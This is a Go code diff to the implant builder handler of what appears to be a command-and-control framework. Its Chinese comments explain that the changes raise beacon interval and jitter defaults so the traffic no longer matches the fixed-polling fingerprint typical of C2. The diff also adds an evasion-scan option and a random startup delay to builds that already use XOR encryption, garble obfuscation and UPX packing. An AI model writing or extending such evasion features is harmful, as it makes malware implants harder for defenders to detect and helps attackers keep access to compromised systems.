@@ -102,11 +102,20 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 	if req.Format == "" {
 		req.Format = "exe"
 	}
+	// 心跳间隔/抖动缺省值：**优先跟随服务端配置**（listener/implant 设置页），
+	// 只有配置也没给才回退内置默认。旧实现硬编码 5s/2%，会把"设置页里配的
+	// 60s 心跳"悄悄改回 5s —— 固定 5s 轮询是最典型的 C2 行为特征。
 	if req.Interval == 0 {
-		req.Interval = 5
+		req.Interval = s.cfg.Implant.Interval
+	}
+	if req.Interval == 0 {
+		req.Interval = 60
 	}
 	if req.Jitter == 0 {
-		req.Jitter = 2
+		req.Jitter = s.cfg.Implant.Jitter
+	}
+	if req.Jitter == 0 {
+		req.Jitter = 20 // 默认 ±20% 抖动：打破固定节奏的流量指纹
 	}
 	if req.RetryCount == 0 {
 		req.RetryCount = 3
@@ -155,6 +164,10 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		XORKeySize:   req.XORKeySize,
 		GarbleEnable: req.GarbleEnable,
 		UPXEnable:    req.UPXEnable,
+		EvasionScan:  req.EvasionScan,
+		// 启动随机延迟：0 = 交给 builder 取服务端配置 / 内置默认
+		StartDelayMin: req.StartupDelayMin,
+		StartDelayMax: req.StartupDelayMax,
 	}
 
 	result, err := s.builder.Build(opts)
@@ -230,15 +243,18 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 	if db := database.Get(); db != nil {
 		now := time.Now().Unix()
 		optsJSON, _ := json.Marshal(map[string]interface{}{
-			"interval":      req.Interval,
-			"jitter":        req.Jitter,
-			"retry_count":   req.RetryCount,
-			"retry_wait":    req.RetryWait,
-			"kill_date":     req.KillDate,
-			"working_hours": req.WorkingHours,
-			"xor_encrypt":   req.XOREncrypt,
-			"garble":        req.GarbleEnable,
-			"upx":           req.UPXEnable,
+			"interval":          req.Interval,
+			"jitter":            req.Jitter,
+			"retry_count":       req.RetryCount,
+			"retry_wait":        req.RetryWait,
+			"kill_date":         req.KillDate,
+			"working_hours":     req.WorkingHours,
+			"xor_encrypt":       req.XOREncrypt,
+			"garble":            req.GarbleEnable,
+			"upx":               req.UPXEnable,
+			"evasion_scan":      req.EvasionScan,
+			"startup_delay_min": opts.StartDelayMin,
+			"startup_delay_max": opts.StartDelayMax,
 		})
 		db.CreateImplant(&database.StoredImplant{
 			ID:          response.ID,
